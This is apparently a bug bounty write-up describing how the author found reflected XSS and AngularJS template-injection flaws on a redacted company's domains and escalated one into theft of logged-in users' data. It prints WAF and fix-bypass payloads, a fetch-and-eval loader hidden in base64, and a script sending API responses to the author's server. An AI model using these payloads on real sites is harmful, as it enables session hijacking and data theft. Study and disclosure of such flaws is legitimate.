
##
#
https://infosecwriteups.com/stealing-your-data-using-xss-bf7e4a31e6ee
#
##

Hello peeps 🐥

This article is all about utilizing my lock-down time in finding bugs under a private program whose name has to be redacted here. █████’s program is active since years with list of professional & responsible hackers named in their Hall Of Fame till today’s year. Still I managed to find multiple XSS and escalated impact of one XSS to sensitive data stealing. So let’s get started 🤙.

Note: This article wants to help new-comers to understand impact escalation and get in-depth knowledge for XSS vulnerabilities.


Timeline:
14.04.2020
Turned on machine, started active + passive discovery of domains and all in-scope assets of █████. Used many tools like Sublist3r, Amass, findomain, subfinder, etc. At last I merged all outputs and made one list.

I believe less in automation testing and laziness 🙃 so I sorted the list and probed them all. Visited each domain one-by-one and ffufed domains which seemed potentially juicy to me. This game goes on.


17.04.2020
After 2 days of manually doing everything, for a domain I got a good list of endpoints using waybackurls, used Arjun to find valid parameters and then got a beautiful reflection 😍.

Payload:
1"><div+onload=alert()>XSS-FOREVER</div>
After this I got more positive vibes 😃 that I can really find more, so the game still goes on 🥱.

18.04.2020
Day after 1st report, got wake up early and without having breakfast turned the machine on to deep dive more into this.


During this hunt, I found potential input for XSS on █████’s important sub-domain which is important.█████.com. This domain is generally referred for login and authentication purpose. At that moment, this thing just brought adrenaline in my blood 🔥 . As this mentioned domain is used in production environment, this had very tough WAF rules which does block every try for the XSS to pop!

Let’s talk deeper about how I bypassed WAF!
Things which were blocked: 'single quotes, <> tags character, ` back-tick, [] square brackets and all other XSS keywords like alert, prompt, console.log and so on.

So I had very limited white-listed characters i.e. () round brackets, “ double quotes, {} curly bracket

The reflection was happening at this point:

<tag ng-init=“█████= { … parameter: ‘reflection’, … }” >

Started with escaping ng-init using ” and using onload=alert() but sadly this was blocked entirely, that means onload= was blocked also alert() was blocked. I couldn’t end this tag as <> were restricted. Tried each and every event handler still no one worked here! Took some break! 🥱

“You need to take a break away from your work area so when you return you are more refreshed and ready to work.” — Byron Pulsifer

After returning back my eyes just saw ng-init which means this is AngularJS application, also this reminded me about XSS using AngularJS injections, generally referred as Client-Side-Template-Injection. Googled this within next second and landed here: PortSwigger Article.

Started with basic confirmation:

{{7*7}} => reflected as => 49

After confirmation I tried with XSS payloads:

{}.”)));foo(1)//”;

Now this injection point was confirmed to injection, but functions like alert() and others were blocked very precisely. Looked around web for AngularJS XSS medium articles, write-ups, security research papers and much more. Investing few hours into this resulted into a valid payload, but the issue was length or completing the payload in one part. So I broke the payload into 2 parts and used 2 different injection points.

Bypassed blocked JS functions using:

_=prompt,_(1)

Final working payload:

{{“a”.constructor.prototype.charAt="".valueOf;$eval("foo()//");}}

Now the issue was $eval() was also getting blocked and we know that payloads which are string needs to get $eval() for execution. Whole payload was working, but everything got stuck at $eval() 🤦🏽‍♂️. Again took some break and read about development docs of Angular to find any alternative function like eval() did not found one easily. Moved to reading security research papers for AngularJS, this took alot of time and attention. Finally found one function of AngularJS which can do so.

Bypassed blocked Angular function using:

$eval() => changed to => $evalAsync()

Okayy, now for all the blocked entities, I had bypasses in-hand, merged them all and formed a final payload in 2 parts and final payload was this

https://important.█████.com/█████/█████?...&param1=value1"+ng-value={{a="a".constructor.prototype;a.charAt="".valueOf}}&param2=value2+ng-val={{$evalAsync("x=(_=prompt,_(1))//")}}
And BOOM 🥳 🎉! I got XSS on █████’s second most important domain, drafted a good report and mailed them and this was my moment.


Surprisingly there were many sub-domains of same production domain which were similar. So the same XSS was existing on all this sub-domains too and I reported them all 💰💰💰.


There were 3 vulnerable endpoints and across 4 similar domains. This went for 4–5 days and then I moved to another asset to look around.

Conclusion: If you find a valid injection point, note down what’s allowed and what’s blocked? Keep mind to adapt environment of app, if any specific thing is blocked look around, look for bypass and different way to specify or mean the same thing, use browser’s console for trial and error. Don’t stop, just bang it!

27.04.2020
After completion of above said method of bug-hunting, I started looking into APIs working manner and all other things. While testing out things, I found very unusual redirection for 404 — Not Found case, page was being loaded and then redirection was made to root endpoint i.e. https://█████.com/ I also got intuitions that something is fishy here 🧐.


Read source code of the page, as page had too much HTML code, but was being redirected to root endpoint even before rendering of page. Handed this page to Arjun 🏹 for finding any hidden parameter for any error message or something like that. Found a valid parameter which was being reflected in <script>tag’s string assignment i.e.

var foo = 'reflection'

This reflection also had only one blocked entity i.e. “ double quotes and on random basis some symbols were not appearing in response,else there was no blocking of any confirm() or eval() or anything. I was amazed and surprised at the same time!


Again, I confirmed basic injection:

Payload: ?foo='+alert()+'

Reflected: var foo = ''+alert()+'' and beautiful alert at █████’s primary domain, this moment was unexpected and simply amazing! Just Imagine This!

But this time, I didn’t want to just report alert(1)🤧 . While testing APIs, I came to know APIs call can be made only from https://█████.com main-top domain and no sub-domains. So I just wanted to use this golden chance to escalate this to something higher. I googled and read many reports in which attackers demonstrated the impact escalation of XSS. Reading such things gave me great ideas to perform something out-of-box🤔.

The Idea:
Let’s call the APIs and copy their response and send that response to my personal server. Sounds very simple right? Haha, it wasn’t so easy🥴!

🚀 Try 0x01:
As I am a person who is known to development and have on-hand experience with JavaScript while project development, so it was easy to get logic in my mind and the same in the code, but as I knew that I had very small window available, as the page where reflection is happening will be in redirection once page gets loaded. For the same, I used some fast-working logic instead of regular old way of using AJAX and then handling with their response success error and bla bla 👽.

JavaScript snippet that I made for performing my idea:

function fe(t) {
    fetch(t).then(t => t.text()).then(t => {
        fetch("https://my-server.com/log/?p=" + btoa(t))
    })
}
urls = ["https://█████.com/v1/api/.../...", 
        "https://█████.com/v2/api/.../...", 
        "https://█████.com/v3/api/.../...",
        ...
], urls.forEach(fe);
I think reading this twice or thrice will make you understand what is happening here. In summary: I have mentioned a function fe() which will make GET request to parameter value passed to this function, upon getting response back from server, make another GET request to my-server.com with base64 encoded value of response body. Next is list of urls which has to be called and we wish to collect, after completion of this list, call forEach() which will do our looping implicitly, without explicitly mentioning any for() or while() loop 🤖 .

Problem: This code snippet was very long for GET request length capacity

Solution: I hosted this JavaScript code on my server and now at the injection point, I just need to call this JavaScript code. Simple? Not really. As I have access to limited JavaScript context and CSP was also implemented.

🚀 Try 0x02:
I had access to eval(), so let’s add our hosted JavaScript using eval(). Read a lot of ways to do this, but they weren’t as fast as it was required, because the page where injection was happening, redirects to root endpoint once page loads. So I referred JavaScript docs from Mozilla. This helped me to get the desired speed for eval()ing my commands using async and await that would get my hosted script and execute it 💀.

JavaScript code for the primary injection point:

!async function() {
    let a = await
    function() {
        fetch('https://my-server.com/log.js').then(t => t.text()).then(d => {
            eval(d)
        })
    }()
}();
In summary: I have called this function importantly in asynchronous mode, calling one more function inside the function which is in await mode, which does make a request of my hosted JavaScript which is talked above. After getting response of this request, I have again eval()ed my JavaScript here, which solves the problem mentioned above. This solution can said to be proof of bypassing CSP rules for not allowing running script from un-trusted source.

Problem: Writing this too in GET request seems to generate errors at browser-end, didn’t knew why?

Solution: I did base64 encode entire above code snippet and submit this to decodeURIComponent() and passing that to atob() and passing that to eval() . Quite confusing?

█████.com/?foo='+eval(atob(decodeURIComponent('IWFzeW5jIGZ1bmN0aW9uKCkge2xldCBhID0gYXdhaXQgZnVuY3Rpb24oKSB7ZmV0Y2goJ2h0dHBzOi8vbXktc2VydmVyLmNvbS9sb2cuanMnKS50aGVuKHQgPT4gdC50ZXh0KCkpLnRoZW4oZCA9PiB7ZXZhbChkKX0pfSgpfSgpOwo=')))+'
Problem: Everything worked as desired, everything worked PERFECT, but for every 2/5 tries, page redirection would happen even before data stealing occurs.

🚀 Try 0x03:
For preventing the redirection from happening, I know that I have to break things, which may generate JavaScript errors, which eventually breaks JavaScript before reaching to redirection state. But before breaking the case, I had to perform all this actions and then I wish to have a explicit break.

After analyzing and many trial and errors, here was the final payload that I used to exploit data stealing.

█████.com/?foo='+eval(atob(decodeURIComponent('IWFzeW5jIGZ1bmN0aW9uKCkge2xldCBhID0gYXdhaXQgZnVuY3Rpb24oKSB7ZmV0Y2goJ2h0dHBzOi8vbXktc2VydmVyLmNvbS9sb2cuanMnKS50aGVuKHQgPT4gdC50ZXh0KCkpLnRoZW4oZCA9PiB7ZXZhbChkKX0pfSgpfSgpOwo=')))+'});var foo='{ 1,
This final payload, stopped redirection + executed things in the way I was wishing to see. 🤟 It was really challenging, as this was my first on-hand experience to deal with such issues and solving them in any real BB program.

At this moment, this malicious crafted URL can be shared and populate around the user, user’s whose account is logged-in will get directly affected by this. There will be zero-sign of data being steal in background. I demonstrated passive activity like calling APIs and routing them to my server and collect them. For any logged-in user who clicks this crafted URL, the risks are:

Leakage of user profile details like: fullname, email, mobile number, date of account creation, user type, userids, ssotoken and much more.
Leakage of user address details like: all added address, receiver name, addressid, complete address, mobile number, timestamp.
Leakage of user wallet details like: balance available in wallet, ownedGUID, ssoId.
Leakage of Order details: orderId, ordered item, quantity, status and basically every order detail you see in your profile.
Besides all these, I can passively enumerate each and every action which is done by the logged in user like wallet statement, order history, frequently recharged mobile numbers list and much more and all this can be done by just adding more API address in the JavaScript code which is hosted at my server.
One more thing to note over here is, this attack is not restricted to passive actions, I could perform more active actions, like transferring wallet balance, do order without interaction and many more things using its API call, performing mobile recharge, deleting user address, unsubscribe from subscriptions, and many more things. But I did a mistake that I hadn’t provided POC for this active attacks, which eventually decreased reward amount. Not a problem, one more lesson learnt 💪.

Let’s talk about fixes bypass!
After reporting all of them, █████ started to deploy fixes and would notify me for the same. For the XSS, █████ tried to apply the fix upon my submitted payloads. But still I bypassed their fixes 3–4 times. I think this is also worth sharing for newcomers 😀. Let’s break this into 3 threads.

1. First XSS:
Fix made for my first report payload, payload is:

1"><div+onload=alert()>XSS-FOREVER</div>
Bypassed fix for this one using:

1\"><x+onpointerover=alert`xss-bypass`>CLICK+HERE+FOR+DETAILS+OF+ERROR</form></body></html>
<div> , onload and () got black-listed. Used <x> , onpointerover and alert`` to bypass.

One more fixed applied by them, but again bypassed that using Chrome-specific event handler.

1\"><x+onpointerrawupdate=alert`xss-bypass`>CLICK+HERE+FOR+DETAILS+OF+ERROR</form></body></html>
One more fixed applied for this, and finally it got non-vulnerable as of now.

2. Data Stealing using XSS
Fix made for my first report payload, payload is:

█████.com/?foo='+eval(atob(decodeURIComponent('IWFzeW5jIGZ1bmN0aW9uKCkge2xldCBhID0gYXdhaXQgZnVuY3Rpb24oKSB7ZmV0Y2goJ2h0dHBzOi8vbXktc2VydmVyLmNvbS9sb2cuanMnKS50aGVuKHQgPT4gdC50ZXh0KCkpLnRoZW4oZCA9PiB7ZXZhbChkKX0pfSgpfSgpOwo=')))+'});var foo='{ 1,
Bypassed this one using:

() were blocked and fix was asked to get confirmed, bypassed this one using URL-encoding ( =>%28, ) => %29 and using backtick ` .

█████.com/?foo='+eval%28atob%28decodeURIComponent%28'IWFzeW5jIGZ1bmN0aW9uKCkge2xldCBhID0gYXdhaXQgZnVuY3Rpb24oKSB7ZmV0Y2goJ2h0dHBzOi8vbXktc2VydmVyLmNvbS9sb2cuanMnKS50aGVuKHQgPT4gdC50ZXh0KCkpLnRoZW4oZCA9PiB7ZXZhbChkKX0pfSgpfSgpOwo='%29%29%29+'}%29;var foo='{ 1,
One more fixed applied for this, and finally it got non-vulnerable as of now.

3. Bunch of XSS
Fix made for my first report payload, payload is:

https://important.█████.com/█████/█████?...&param1=value1"+ng-value={{a="a".constructor.prototype;a.charAt="".valueOf}}&param2=value2+ng-val={{$evalAsync("x=(_=prompt,_(1))//")}}
This payload already had lot of bypasses. Still when this got blocked I managed to bypass blocking of () using ` (Applicable to all other important domain except important.█████.com)

Bypassed this with this payload:

https://important.█████.com/█████/█████?...&param1=value1"+ng-val={{{}.")));x=alert;x(1)//"}}+"
They fixed this one too, so I bypassed fix once again using:

https://important.█████.com/█████/█████?...&param1=value1"+ng-val={{{}.")));new+Function`al\ert\`XSS-By-Viren\``;//"}}+"
The blocking word “alert” was bypassed using al\ert which words fine and one more fixed applied for this, and finally it got non-vulnerable as of now.

Coming to the end, bug bounty is not just about finding and reporting bugs to get rewarded, but it’s all about being creative, furious and smart, and one of the important thing to work with passion not for money, I have mentioned timeline just to make new-comers understand that it can take time to get more and more bugs, so just chill and do hunting. This was the story of multiple sleeping XSS in █████ and finding bugs from sub-domains to primary sub-domains and primary domain.

For all this bugs I was awarded by █████’s Bug Bounty Program.

██.██.2020 : INR █████ for the stealing user information report

██.██.2020 : INR █████ for the all other XSS reports

First thanks to █████’s Security Team, for good co-operation and for being active and responding to me. I have noticed many companies which doesn’t even reply to your mail, and █████ having such good platform for security researcher is worth exceptional mention over here.

Most sincere thanks to Somdev Sangwan 🙏 for his awesome repository about XSS, that repository and the knowledge shared over there is the true source of my learning. For fix bypasses and advance payload I use PayloadAllThings repository 🔥.

I would like to mention tribute to that almighty 🙏 Lord Rama and 🙏 Lord Hanuman. I believe that without their grace, I am nothing and everything to me is their gift. I bow them and will always bow them.
